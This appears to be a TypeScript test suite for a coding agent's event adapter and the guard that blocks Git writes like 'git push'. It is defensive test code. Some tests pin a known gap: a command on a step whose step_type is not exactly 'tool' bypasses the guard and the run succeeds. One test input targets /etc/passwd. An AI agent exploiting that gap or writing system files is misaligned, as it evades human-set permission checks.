  it("tool steps are deduplicated per step_index, not per command: the same Git write in a second step is checked again", () => {
    const push = (index: number) =>
      STEP({
        step_index: index,
        step_type: "tool",
        tool_name: "run_command",
        tool_info: { name: "run_command", parameters: { command: "git push origin main" } },
      });
    const r = run([INIT(), push(1), push(2), push(1), RESULT()]);
    expect(r.raw.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "shell", name: "run_command", command: "git push origin main" },
      { kind: "tool_call", tool: "shell", name: "run_command", command: "git push origin main" },
    ]);
    const flagged = r.events.filter((e) => e.kind === "tool_call" && e.violation !== undefined);
    expect(flagged).toHaveLength(2);
    expect(r.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", nativeSessionId: CID });
  });

  it("pins the gap: tool parameters on a step whose step_type is not exactly `tool` never reach the guard", () => {
    const params = { name: "run_command", parameters: { command: "git push origin main" } };
    for (const stepType of ["agent_response", "user_input", "checkpoint", "TOOL", "Tool", " tool"]) {
      const r = run([INIT(), STEP({ step_index: 1, step_type: stepType, tool_info: params }), RESULT()]);
      expect(
        r.raw.some((e) => e.kind === "tool_call"),
        stepType,
      ).toBe(false);
      // Not an unknown line either: any string step_type with a numeric step_index is a readable step.
      expect(r.state.unknownEvents, stepType).toBe(0);
      expect(r.result, stepType).toMatchObject({ ok: true, nativeSessionId: CID });
    }
  });

  it("fixture non_tool_step_command replays to a success: a command off a `tool` step is not seen (gap, pinned)", async () => {
    const report = await runConformanceCase({
      kind: "task_failure",
      adapter: replayAdapter("non_tool_step_command"),
      request: {
        runId: "run_antigravity_t433_residual",
        objective: "synthetic antigravity objective",
        constraints: [],
        workspace: { cwd: makeCwd(), writable: true },
        bypassApproved: true,
      },
      profile: PRIVILEGED_BYPASS_PROFILE,
      expect: { ok: true, nativeSessionId: DEFAULT_SESSION_ID },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, unknownEventCount: 0 });
    const lines = readFileSync(fixturePath("non_tool_step_command"), "utf8")
      .split("\n")
      .filter((l) => l !== "" && !l.includes('"_fixture"'));
    expect(run(lines).raw.some((e) => e.kind === "tool_call")).toBe(false);
  });

  it("init reads init.model before the line's model, and the line's backing vendor before init's (snake before camel)", () => {
    expect(bound([INIT({ model: "inner" }, { model: "outer" })])).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "inner" },
    ]);
    expect(bound([INIT({}, { model: "outer" })])).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "outer" },
    ]);
    const all = { backing_provider: "outer-snake", backingProvider: "outer-camel" };
    const nested = { backing_provider: "inner-snake", backingProvider: "inner-camel" };
    const backing = (init: Record<string, unknown>, outer: Record<string, unknown>) => {
      const [b] = bound([INIT(init, outer)]);
      return b?.kind === "session_bound" ? b.backingProvider : undefined;
    };
    expect(backing(nested, all)).toBe("outer-snake");
    expect(backing(nested, { backingProvider: "outer-camel" })).toBe("outer-camel");
    expect(backing(nested, {})).toBe("inner-snake");
    expect(backing({ backingProvider: "inner-camel" }, {})).toBe("inner-camel");
    // A non-string higher-precedence value is read and dropped, not skipped over to the next spelling.
    expect(backing(nested, { backing_provider: 7 })).toBeUndefined();
  });

  it("a result with no init reads result.model before the line's model and the line's backing vendor before the envelope's", () => {
    expect(bound([RESULT({ model: "inner" }, { model: "outer" })])).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "inner" },
    ]);
    expect(bound([RESULT({}, { model: "outer" })])).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "outer" },
    ]);
    expect(bound([RESULT({ backing_provider: "inner-snake" }, { backingProvider: "outer-camel" })])[0]).toMatchObject({
      backingProvider: "outer-camel",
    });
    expect(bound([RESULT({ backingProvider: "inner-camel" })])[0]).toMatchObject({ backingProvider: "inner-camel" });
  });

  it("once init has bound, the result's model and backing vendor change nothing: no second session_bound", () => {
    const r = run([
      INIT({ model: "init-model" }, { backing_provider: "init-vendor" }),
      RESULT({ model: "result-model", backing_provider: "result-vendor" }),
    ]);
    expect(r.raw.filter((e) => e.kind === "session_bound")).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "init-model", backingProvider: "init-vendor" },
    ]);
    expect(r.result).toMatchObject({ ok: true, nativeSessionId: CID });
  });

  it("pins: a SUCCESS envelope with tokens and no conversation id anywhere succeeds with no nativeSessionId", () => {
    // A first run that binds no id leaves nothing to resume (a resumed run with no id fails closed, owner decision 67);
    // a recorded success always carried a UUID ([LIVE] C4), so this shape is synthetic.
    for (const id of [undefined, "", 7, null, { id: CID }]) {
      const r = run([RESULT({ conversation_id: id })]);
      expect(r.state.nativeSessionId, JSON.stringify(id)).toBeUndefined();
      expect(r.result, JSON.stringify(id)).toEqual({ ok: true, unknownEventCount: 0, summary: "ok" });
    }
    // With init bound, a result id that is not a string is no anomaly and does not rebind.
    expect(run([INIT(), RESULT({ conversation_id: 7 })]).result).toMatchObject({ ok: true, nativeSessionId: CID });
  });

  it("a second result for another conversation reports both anomalies, keeps the first id and records usage once", () => {
    const r = run([INIT(), RESULT(), RESULT({ conversation_id: OTHER })]);
    expect(r.raw.flatMap((e) => (e.kind === "provider_error" ? [`${e.category}: ${e.message}`] : []))).toEqual([
      "protocol: more than one result line",
      "protocol: conversation id changed mid-run",
    ]);
    expect(r.raw.filter((e) => e.kind === "usage")).toHaveLength(1);
    expect(r.state.nativeSessionId).toBe(CID);
    expect(r.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "protocol: more than one result line",
      nativeSessionId: CID,
    });
  });
});

describe("antigravity tool parameters cannot shadow a command (T4.33, synthetic shapes)", () => {
  // Every parameter container and key is read, so an empty, non-string or benign value in a higher-precedence spot no
  // longer hides a Git write in a lower one from the ADR-0039 guard. Synthetic lines only; the keys stay Assumptions.
  const CID = "0b6c2d1e-0000-4000-8000-0000000000ce";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const INIT = j({ event: "init", conversation_id: CID, init: { cwd: "/work/tree" } });
  const RESULT = j({
    event: "result",
    result: { conversation_id: CID, status: "SUCCESS", response: "ok", usage: USAGE },
  });
  const STEP = (index: number, extra: Record<string, unknown>) =>
    j({ event: "step_update", conversation_id: CID, step_index: index, state: "ACTIVE", step_type: "tool", ...extra });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const run = (steps: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const raw = [INIT, ...steps, RESULT].flatMap((l) => a.parseEvent(l, state));
    const events = raw.map((e) => guardEvent(e, { cwd: "/work/tree", home: "/home/synthetic", bypass: true }));
    return { state, calls: raw.filter((e) => e.kind === "tool_call"), result: a.extractResult(events, EXIT0) };
  };
  const PUSH = "git push origin main";

  it("an empty, non-string or benign `command` does not hide a Git write under `CommandLine`", () => {
    for (const command of ["", 7, null, ["git", "status"], { cmd: "ls" }, "ls"]) {
      const r = run([STEP(1, { tool_info: { name: "run_command", parameters: { command, CommandLine: PUSH } } })]);
      const label = JSON.stringify(command);
      expect(
        r.calls.flatMap((e) => (e.kind === "tool_call" && e.command !== undefined ? [e.command] : [])),
        label,
      ).toEqual(command === "ls" ? ["ls", PUSH] : [PUSH]);
      expect(r.result, label).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED", nativeSessionId: CID });
    }
  });

  it("a container without a command does not hide a Git write in a later container", () => {
    const shapes: Record<string, unknown>[] = [
      { tool_info: { name: "run_command", parameters: { path: "/work/tree" }, args: { CommandLine: PUSH } } },
      { tool_info: { name: "run_command", parameters: {}, input: { command: PUSH } } },
      { tool_info: { name: "run_command", args: { command: "" } }, parameters: { command: PUSH } },
      { tool_info: { name: "run_command", parameters: { command: "ls" } }, input: { CommandLine: PUSH } },
    ];
    for (const shape of shapes) {
      const r = run([STEP(1, shape)]);
      const label = JSON.stringify(shape);
      expect(
        r.calls.some((e) => e.kind === "tool_call" && e.tool === "shell" && e.command === PUSH),
        label,
      ).toBe(true);
      // A command anywhere drops the path from the report, as before.
      expect(
        r.calls.some((e) => e.kind === "tool_call" && e.target !== undefined),
        label,
      ).toBe(false);
      expect(r.result, label).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    }
  });

  it("the same command in several containers and keys is reported once; a clean call still succeeds", () => {
    const r = run([
      STEP(1, {
        tool_info: { name: "run_command", parameters: { command: "ls", CommandLine: "ls" }, args: { command: "ls" } },
        input: { CommandLine: "ls" },
      }),
    ]);
    expect(r.calls).toEqual([{ kind: "tool_call", tool: "shell", name: "run_command", command: "ls" }]);
    expect(r.result).toMatchObject({ ok: true, nativeSessionId: CID });
  });

  it("an empty `path` does not hide a later path key or container; with no value at all the call is reported bare", () => {
    const outside = run([
      STEP(1, { tool_info: { name: "write_to_file", parameters: { path: "" }, args: { file_path: "/etc/passwd" } } }),
    ]);
    expect(outside.calls).toEqual([{ kind: "tool_call", tool: "other", name: "write_to_file", target: "/etc/passwd" }]);
    const bare = run([STEP(1, { tool_info: { name: "edit", parameters: { command: "", path: "", file_path: 3 } } })]);
    expect(bare.calls).toEqual([{ kind: "tool_call", tool: "other", name: "edit" }]);
    expect(bare.result).toMatchObject({ ok: true });
  });

  it("a later update reports only the commands its step has not reported yet", () => {
    const params = (p: Record<string, unknown>) => ({ tool_info: { name: "run_command", parameters: p } });
    const r = run([
      STEP(1, params({ command: "ls" })),
      STEP(1, params({ command: "ls", CommandLine: PUSH })),
      STEP(1, params({ CommandLine: PUSH, command: "ls" })),
    ]);
    expect(r.calls).toEqual([
      { kind: "tool_call", tool: "shell", name: "run_command", command: "ls" },
      { kind: "tool_call", tool: "shell", name: "run_command", command: PUSH },
    ]);
    expect(r.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });
});
